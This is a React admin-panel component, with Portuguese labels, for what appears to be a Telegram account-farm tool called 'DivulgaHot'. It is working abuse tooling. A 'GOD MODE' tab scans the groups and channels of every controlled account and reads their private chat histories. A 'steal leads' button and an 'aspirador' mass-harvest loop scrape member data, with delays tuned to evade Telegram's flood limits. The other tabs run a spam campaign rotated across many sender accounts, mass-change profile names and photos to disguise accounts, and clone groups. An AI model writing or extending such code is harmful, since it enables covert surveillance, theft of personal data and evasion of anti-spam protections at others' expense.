import { useState, useEffect, useRef } from 'react';

export default function AdminPanel() {
  const [isAuthenticated, setIsAuthenticated] = useState(false);
  const [passwordInput, setPasswordInput] = useState('');
  
  // Tabs
  const [tab, setTab] = useState('spy'); 
  const [sessions, setSessions] = useState([]);
  const [stats, setStats] = useState({ total: 0, pending: 0, sent: 0 });
  const [logs, setLogs] = useState([]);
  const [processing, setProcessing] = useState(false);

  // Estados do Disparo
  const [msg, setMsg] = useState('{Olá|Oi}, tudo bem?');
  const [selectedPhones, setSelectedPhones] = useState(new Set());
  const [progress, setProgress] = useState(0);

  // --- GOD MODE (Espião Global) ---
  const [allGroups, setAllGroups] = useState([]);
  const [allChannels, setAllChannels] = useState([]);
  const [isScanning, setIsScanning] = useState(false);
  const [scanProgress, setScanProgress] = useState(0);
  const [filterNumber, setFilterNumber] = useState('');

  // Estados de Chat e Visualização
  const [viewingChat, setViewingChat] = useState(null);
  const [chatHistory, setChatHistory] = useState([]);
  const [loadingHistory, setLoadingHistory] = useState(false);

  // MODO ASPIRADOR (Auto Harvest)
  const [isHarvestingAll, setIsHarvestingAll] = useState(false);
  const [totalHarvestedSession, setTotalHarvestedSession] = useState(0);
  const stopHarvestRef = useRef(false);

  // Tools
  const [newName, setNewName] = useState('');
  const [photoUrl, setPhotoUrl] = useState('');
  const [storyUrl, setStoryUrl] = useState('');
  const [storyCaption, setStoryCaption] = useState('');

  // --- INICIALIZAÇÃO ---
  useEffect(() => {
    const savedGroups = localStorage.getItem('godModeGroups');
    const savedChannels = localStorage.getItem('godModeChannels');
    if (savedGroups) setAllGroups(JSON.parse(savedGroups));
    if (savedChannels) setAllChannels(JSON.parse(savedChannels));
  }, []);

  const handleLogin = async (e) => {
    e.preventDefault();
    try {
      const res = await fetch('/api/admin-login', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({ password: passwordInput })
      });
      const data = await res.json();
      if(data.success) { 
          setIsAuthenticated(true); 
          fetchData(); 
      } else {
          alert('Senha incorreta');
      }
    } catch (e) { alert('Erro de conexão'); }
  };

  const fetchData = async () => {
    try {
      const sRes = await fetch('/api/list-sessions');
      const sData = await sRes.json();
      setSessions(sData.sessions || []);
      
      const stRes = await fetch('/api/stats');
      if (stRes.ok) setStats(await stRes.json());
    } catch (e) { console.error(e); }
  };

  const addLog = (text) => setLogs(prev => [`[${new Date().toLocaleTimeString()}] ${text}`, ...prev]);

  // --- FUNÇÕES DE DASHBOARD ---
  const toggleSelect = (phone) => {
    const newSet = new Set(selectedPhones);
    if (newSet.has(phone)) newSet.delete(phone); else newSet.add(phone);
    setSelectedPhones(newSet);
  };
  
  const checkAllStatus = async () => { /* Mantido simples para economizar espaço */ };

  const handleDelete = async (phone) => {
      if(!confirm(`Remover ${phone}?`)) return;
      await fetch('/api/delete-session', { method: 'POST', body: JSON.stringify({phone}), headers: {'Content-Type': 'application/json'} });
      setSessions(prev => prev.filter(s => s.phone_number !== phone));
  };

  const startRealCampaign = async () => {
     if (selectedPhones.size === 0) return alert('Selecione contas!');
     setProcessing(true);
     addLog('🚀 Iniciando disparo...');
     try {
         const res = await fetch('/api/get-campaign-leads'); 
         const data = await res.json();
         const leads = data.leads || [];
         if (leads.length === 0) { setProcessing(false); return alert('Sem leads pendentes!'); }
         
         const phones = Array.from(selectedPhones);
         for (let i = 0; i < leads.length; i++) {
             const sender = phones[i % phones.length];
             // addLog(`Enviando: ${sender} > ${leads[i].user_id}`); // Log verbose removido
             await fetch('/api/dispatch', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ senderPhone: sender, target: leads[i].user_id, message: msg, leadDbId: leads[i].id })
             });
             setProgress(Math.round(((i+1)/leads.length)*100));
             await new Promise(r => setTimeout(r, 1000)); // Delay
         }
         addLog('✅ Campanha finalizada.'); fetchData();
     } catch (e) { addLog(`Erro: ${e.message}`); }
     setProcessing(false);
  };

  // --- GOD MODE: ESCANEAR REDE ---
  const scanNetwork = async () => {
      if (sessions.length === 0) return alert("Nenhuma conta conectada.");
      setIsScanning(true);
      setScanProgress(0);

      let groups = [];
      let channels = [];

      for (let i = 0; i < sessions.length; i++) {
          const phone = sessions[i].phone_number;
          setScanProgress(Math.round(((i + 1) / sessions.length) * 100));
          
          try {
              const res = await fetch('/api/spy/list-chats', { 
                  method: 'POST', 
                  body: JSON.stringify({ phone }), 
                  headers: {'Content-Type': 'application/json'} 
              });
              const data = await res.json();
              if (data.chats) {
                  data.chats.forEach(c => {
                      const chatObj = { ...c, ownerPhone: phone };
                      if (c.type === 'Canal') channels.push(chatObj);
                      else groups.push(chatObj);
                  });
              }
          } catch (e) { console.error(`Erro ao ler ${phone}`); }
      }

      const uniqueGroups = [...new Map(groups.map(item => [item.id, item])).values()];
      const uniqueChannels = [...new Map(channels.map(item => [item.id, item])).values()];

      uniqueGroups.sort((a,b) => b.participantsCount - a.participantsCount);
      uniqueChannels.sort((a,b) => b.participantsCount - a.participantsCount);

      setAllGroups(uniqueGroups);
      setAllChannels(uniqueChannels);
      localStorage.setItem('godModeGroups', JSON.stringify(uniqueGroups));
      localStorage.setItem('godModeChannels', JSON.stringify(uniqueChannels));

      setIsScanning(false);
      alert(`Varredura completa! ${uniqueGroups.length} Grupos e ${uniqueChannels.length} Canais.`);
  };

  // --- MODO ASPIRADOR (MASS HARVEST) ---
  const startMassHarvest = async () => {
      const targets = [...allGroups, ...allChannels];
      if (targets.length === 0) return alert("Escaneie a rede primeiro!");
      
      if (!confirm(`⚠️ MODO ASPIRADOR\n\nIsso vai varrer ${targets.length} grupos/canais automaticamente para extrair leads.\n\nO processo pode demorar. Deseja iniciar?`)) return;

      setIsHarvestingAll(true);
      stopHarvestRef.current = false;
      setTotalHarvestedSession(0);
      let sessionCount = 0;

      addLog(`🕷️ Iniciando coleta em massa de ${targets.length} fontes...`);

      for (let i = 0; i < targets.length; i++) {
          if (stopHarvestRef.current) {
              addLog('🛑 Coleta em massa interrompida pelo usuário.');
              break;
          }

          const chat = targets[i];
          // Atualiza status visual (gambiarra para não criar state pesado)
          document.title = `[${i}/${targets.length}] Aspirando...`;

          try {
              const res = await fetch('/api/spy/harvest', { 
                  method: 'POST', 
                  body: JSON.stringify({ 
                      phone: chat.ownerPhone, 
                      chatId: chat.id, 
                      chatName: chat.title, 
                      isChannel: chat.type === 'Canal' 
                  }), 
                  headers: {'Content-Type': 'application/json'} 
              });
              const data = await res.json();
              
              if(data.success && data.count > 0) {
                  sessionCount += data.count;
                  setTotalHarvestedSession(sessionCount);
                  addLog(`✅ +${data.count} leads de "${chat.title}"`);
              } else if (data.error) {
                  // addLog(`⚠️ Erro em "${chat.title}": ${data.error}`); // Log menos verboso
              }
          } catch (e) {
              console.error(e);
          }

          // Delay de segurança para não tomar FloodWait
          await new Promise(r => setTimeout(r, 2000));
      }

      setIsHarvestingAll(false);
      document.title = "DivulgaHot Admin";
      addLog(`🏁 COLETA FINALIZADA! Total nesta sessão: ${sessionCount} novos leads.`);
      fetchData(); // Atualiza total geral
  };

  const stopHarvest = () => {
      stopHarvestRef.current = true;
  };

  // --- AÇÕES DO ESPIÃO INDIVIDUAL ---
  const openChat = async (chat) => {
      setViewingChat(chat);
      setLoadingHistory(true);
      setChatHistory([]);
      try {
        const res = await fetch('/api/spy/get-history', { 
            method: 'POST', 
            body: JSON.stringify({ phone: chat.ownerPhone, chatId: chat.id }), 
            headers: {'Content-Type': 'application/json'} 
        });
        const data = await res.json();
        setChatHistory(data.history || []);
      } catch (e) { alert('Erro ao carregar mensagens'); }
      setLoadingHistory(false);
  };

  const stealLeads = async (chat) => {
      if(!confirm(`Roubar leads de "${chat.title}"?`)) return;
      addLog(`🕷️ Extraindo de ${chat.title}...`);
      const res = await fetch('/api/spy/harvest', { 
          method: 'POST', 
          body: JSON.stringify({ 
              phone: chat.ownerPhone, 
              chatId: chat.id, 
              chatName: chat.title, 
              isChannel: chat.type === 'Canal' 
          }), 
          headers: {'Content-Type': 'application/json'} 
      });
      const data = await res.json();
      if(data.success) {
          addLog(`✅ ${data.message}`);
          fetchData(); 
      } else {
          addLog(`❌ Erro: ${data.error}`);
      }
  };

  const cloneGroup = async (chat) => {
      if(!confirm(`Clonar estrutura de "${chat.title}"?`)) return;
      const res = await fetch('/api/spy/clone-group', {
          method: 'POST',
          body: JSON.stringify({ phone: chat.ownerPhone, originalChatId: chat.id, originalTitle: chat.title }),
          headers: {'Content-Type': 'application/json'}
      });
      if(res.ok) addLog(`✅ Clonagem iniciada.`);
  };
    
  const handleUpdateProfile = async () => { /* ... */ }; // Mantido igual

  const filteredGroups = filterNumber ? allGroups.filter(g => g.ownerPhone.includes(filterNumber)) : allGroups;
  const filteredChannels = filterNumber ? allChannels.filter(c => c.ownerPhone.includes(filterNumber)) : allChannels;

  if (!isAuthenticated) return (
      <div style={{height:'100vh', background:'#000', display:'flex', alignItems:'center', justifyContent:'center'}}>
          <form onSubmit={handleLogin}><input type="password" value={passwordInput} onChange={e=>setPasswordInput(e.target.value)} placeholder="Senha Admin" style={{padding:'10px', borderRadius:'5px'}}/></form>
      </div>
  );

  return (
    <div style={{ backgroundColor: '#0d1117', color: '#c9d1d9', minHeight: '100vh', padding: '20px', fontFamily: 'monospace' }}>
        
        {/* MODAL DE CHAT */}
        {viewingChat && (
            <div style={{position:'fixed', top:0, left:0, width:'100%', height:'100%', background:'rgba(0,0,0,0.9)', zIndex:999, display:'flex', alignItems:'center', justifyContent:'center'}}>
                <div style={{width:'600px', height:'80%', background:'#161b22', border:'1px solid #30363d', borderRadius:'10px', display:'flex', flexDirection:'column'}}>
                    <div style={{padding:'15px', borderBottom:'1px solid #30363d', display:'flex', justifyContent:'space-between', background:'#21262d'}}>
                        <div><h3 style={{margin:0, color:'white'}}>{viewingChat.title}</h3><small>Via: {viewingChat.ownerPhone}</small></div>
                        <button onClick={()=>setViewingChat(null)} style={{background:'none', border:'none', color:'red', fontSize:'20px', cursor:'pointer'}}>✖</button>
                    </div>
                    <div style={{flex:1, overflowY:'auto', padding:'15px', display:'flex', flexDirection:'column', gap:'10px'}}>
                        {loadingHistory ? <p style={{textAlign:'center'}}>Carregando...</p> : 
                            chatHistory.length === 0 ? <p style={{textAlign:'center'}}>Histórico vazio.</p> :
                            chatHistory.map((m, i) => (
                                <div key={i} style={{alignSelf: m.isOut ? 'flex-end' : 'flex-start', background: m.isOut ? '#238636' : '#30363d', padding:'10px', borderRadius:'8px', maxWidth:'80%'}}>
                                    <div style={{fontSize:'10px', opacity:0.7, marginBottom:'2px'}}>{m.sender}</div>
                                    {m.media && (<div style={{marginBottom:'5px'}}><img src={m.media} alt="Mídia" style={{maxWidth:'100%', borderRadius:'5px'}} /></div>)}
                                    <div style={{color:'white'}}>{m.text}</div>
                                </div>
                            ))
                        }
                    </div>
                </div>
            </div>
        )}

        <div style={{marginBottom:'20px', borderBottom:'1px solid #30363d', paddingBottom:'10px'}}>
            <button onClick={()=>setTab('spy')} style={{marginRight:'10px', padding:'10px 20px', background: tab==='spy'?'#8957e5':'transparent', border:'1px solid #8957e5', color:'white', borderRadius:'5px', cursor:'pointer'}}>👁️ GOD MODE</button>
            <button onClick={()=>setTab('dashboard')} style={{marginRight:'10px', padding:'10px 20px', background: tab==='dashboard'?'#238636':'transparent', border:'1px solid #238636', color:'white', borderRadius:'5px', cursor:'pointer'}}>🚀 DASHBOARD</button>
            <button onClick={()=>setTab('tools')} style={{padding:'10px 20px', background: tab==='tools'?'#1f6feb':'transparent', border:'1px solid #1f6feb', color:'white', borderRadius:'5px', cursor:'pointer'}}>🛠️ TOOLS</button>
        </div>

        {tab === 'spy' && (
            <div>
                <div style={{display:'flex', justifyContent:'space-between', alignItems:'center', marginBottom:'20px', background:'#161b22', padding:'15px', borderRadius:'8px'}}>
                    <div>
                        <h2 style={{margin:0, color:'white'}}>Radar Global</h2>
                        <div style={{fontSize:'12px', color:'#8b949e'}}>
                            {allGroups.length} Grupos | {allChannels.length} Canais
                        </div>
                    </div>
                    <div style={{display:'flex', gap:'10px', alignItems:'center'}}>
                        {isHarvestingAll && <div style={{color:'#00ff00', fontWeight:'bold', marginRight:'10px'}}>ASPIRANDO: +{totalHarvestedSession} leads...</div>}
                        
                        {!isHarvestingAll ? (
                             <button onClick={startMassHarvest} style={{padding:'10px 20px', background:'#238636', color:'white', border:'none', borderRadius:'5px', cursor:'pointer', fontWeight:'bold'}}>🕷️ ASPIRAR TUDO</button>
                        ) : (
                             <button onClick={stopHarvest} style={{padding:'10px 20px', background:'#ff5c5c', color:'white', border:'none', borderRadius:'5px', cursor:'pointer', fontWeight:'bold'}}>🛑 PARAR</button>
                        )}

                        <input type="text" placeholder="Filtrar..." value={filterNumber} onChange={e => setFilterNumber(e.target.value)} style={{padding:'10px', borderRadius:'5px', background:'#0d1117', border:'1px solid #30363d', color:'white'}}/>
                        <button onClick={scanNetwork} disabled={isScanning} style={{padding:'10px 20px', background:'#8957e5', color:'white', border:'none', borderRadius:'5px', cursor:'pointer', fontWeight:'bold'}}>{isScanning ? `${scanProgress}%` : '🔄 SCAN'}</button>
                    </div>
                </div>

                <div style={{display:'grid', gridTemplateColumns:'1fr 1fr', gap:'20px'}}>
                    {/* LISTA DE GRUPOS */}
                    <div style={{background:'#161b22', padding:'15px', borderRadius:'8px'}}>
                        <h3 style={{color:'#d29922', borderBottom:'1px solid #30363d', paddingBottom:'10px', marginTop:0}}>👥 GRUPOS ({filteredGroups.length})</h3>
                        <div style={{maxHeight:'70vh', overflowY:'auto'}}>
                            {filteredGroups.map(g => (
                                <div key={g.id} style={{display:'flex', alignItems:'center', gap:'10px', padding:'10px', borderBottom:'1px solid #21262d'}}>
                                    <div style={{width:'40px', height:'40px', borderRadius:'50%', background:'#30363d', overflow:'hidden'}}>{g.photo ? <img src={g.photo} style={{width:'100%', height:'100%'}}/> : <div style={{textAlign:'center', lineHeight:'40px'}}>👥</div>}</div>
                                    <div style={{flex:1}}><div style={{fontWeight:'bold', color:'white', whiteSpace:'nowrap', overflow:'hidden', textOverflow:'ellipsis', maxWidth:'200px'}}>{g.title}</div><div style={{fontSize:'11px', color:'#8b949e'}}>{g.participantsCount} leads • {g.ownerPhone}</div></div>
                                    <button onClick={()=>openChat(g)} style={{background:'#21262d', border:'1px solid #30363d', color:'white', borderRadius:'4px', cursor:'pointer'}}>👁️</button>
                                    <button onClick={()=>stealLeads(g)} style={{background:'#d29922', border:'none', color:'white', borderRadius:'4px', cursor:'pointer', fontWeight:'bold', fontSize:'12px', padding:'5px 10px'}}>🕷️</button>
                                </div>
                            ))}
                        </div>
                    </div>

                    {/* LISTA DE CANAIS */}
                    <div style={{background:'#161b22', padding:'15px', borderRadius:'8px'}}>
                        <h3 style={{color:'#3390ec', borderBottom:'1px solid #30363d', paddingBottom:'10px', marginTop:0}}>📢 CANAIS ({filteredChannels.length})</h3>
                        <div style={{maxHeight:'70vh', overflowY:'auto'}}>
                            {filteredChannels.map(c => (
                                <div key={c.id} style={{display:'flex', alignItems:'center', gap:'10px', padding:'10px', borderBottom:'1px solid #21262d'}}>
                                    <div style={{width:'40px', height:'40px', borderRadius:'50%', background:'#30363d', overflow:'hidden'}}>{c.photo ? <img src={c.photo} style={{width:'100%', height:'100%'}}/> : <div style={{textAlign:'center', lineHeight:'40px'}}>📢</div>}</div>
                                    <div style={{flex:1}}><div style={{fontWeight:'bold', color:'white', whiteSpace:'nowrap', overflow:'hidden', textOverflow:'ellipsis', maxWidth:'200px'}}>{c.title}</div><div style={{fontSize:'11px', color:'#8b949e'}}>{c.participantsCount} inscritos • {c.ownerPhone}</div></div>
                                    <button onClick={()=>openChat(c)} style={{background:'#21262d', border:'1px solid #30363d', color:'white', borderRadius:'4px', cursor:'pointer'}}>👁️</button>
                                    <button onClick={()=>stealLeads(c)} style={{background:'#1f6feb', border:'none', color:'white', borderRadius:'4px', cursor:'pointer', fontWeight:'bold', fontSize:'10px', padding:'5px 10px'}}>🕷️ TENTAR</button>
                                </div>
                            ))}
                        </div>
                    </div>
                </div>
            </div>
        )}

        {tab === 'dashboard' && (
             <div style={{background:'#161b22', padding:'20px', borderRadius:'8px'}}>
                {/* DASHBOARD MANTIDO IGUAL AO ANTERIOR */}
                <div style={{display:'flex', gap:'20px', marginBottom:'20px'}}>
                    <div style={{flex:1, background:'#0d1117', padding:'15px', textAlign:'center', border:'1px solid #d29922'}}><h2 style={{margin:0, color:'#d29922'}}>{stats.pending}</h2><small>Pendentes</small></div>
                    <div style={{flex:1, background:'#0d1117', padding:'15px', textAlign:'center', border:'1px solid #238636'}}><h2 style={{margin:0, color:'#238636'}}>{stats.sent}</h2><small>Enviados</small></div>
                    <div style={{flex:1, background:'#0d1117', padding:'15px', textAlign:'center', border:'1px solid #3390ec'}}><h2 style={{margin:0, color:'#3390ec'}}>{progress}%</h2><small>Progresso</small></div>
                </div>
                <h3>Disparo em Massa</h3>
                <textarea value={msg} onChange={e=>setMsg(e.target.value)} style={{width:'100%', height:'80px', background:'#0d1117', color:'white', border:'1px solid #30363d', padding:'10px'}}/>
                <button onClick={startRealCampaign} disabled={processing} style={{marginTop:'15px', width:'100%', padding:'20px', background: processing ? '#21262d' : '#238636', color:'white', border:'none', cursor:'pointer', fontWeight:'bold'}}>{processing ? 'ENVIANDO...' : 'INICIAR DISPARO'}</button>
                <div style={{marginTop:'20px', height:'150px', overflowY:'auto', background:'#000', padding:'10px', fontSize:'12px'}}>{logs.map((l,i)=><div key={i}>{l}</div>)}</div>
             </div>
        )}
        
        {tab === 'tools' && (
             <div style={{ backgroundColor: '#161b22', padding: '20px' }}>
                <h3>🎭 Camuflagem em Massa</h3>
                <input type="text" placeholder="Nome" value={newName} onChange={e => setNewName(e.target.value)} style={{ width: '100%', marginBottom: '10px', padding: '10px', background: '#0d1117', border: '1px solid #30363d', color: 'white' }} />
                <input type="text" placeholder="Foto URL" value={photoUrl} onChange={e => setPhotoUrl(e.target.value)} style={{ width: '100%', marginBottom: '10px', padding: '10px', background: '#0d1117', border: '1px solid #30363d', color: 'white' }} />
                <button onClick={handleUpdateProfile} style={{ width: '100%', padding: '10px', background: '#8957e5', color: 'white', border: 'none' }}>ATUALIZAR PERFIS</button>
            </div>
        )}
    </div>
  );
}
